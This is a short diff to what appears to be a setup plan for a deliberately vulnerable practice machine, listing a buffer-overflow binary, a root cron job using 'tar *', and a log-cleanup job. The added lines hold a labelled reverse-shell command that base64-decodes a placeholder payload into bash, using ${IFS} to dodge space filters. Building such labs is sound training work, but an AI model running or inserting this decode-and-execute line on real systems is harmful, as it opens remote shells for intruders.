@@ -5,3 +5,9 @@
 3. Create a binary vulnerable to BoF to get code execution (optional).
 4. Create a CronJob from root running a bad script which is used for backup. (tar *)
 5. Cron job to clean /var/log/apache2/access.log
+
+### PakageDownloader.c
+```bash
+# Reverse shell command
+echo${IFS}<BASE64-Encoded-Payload>|base64${IFS}-d|bash
+```
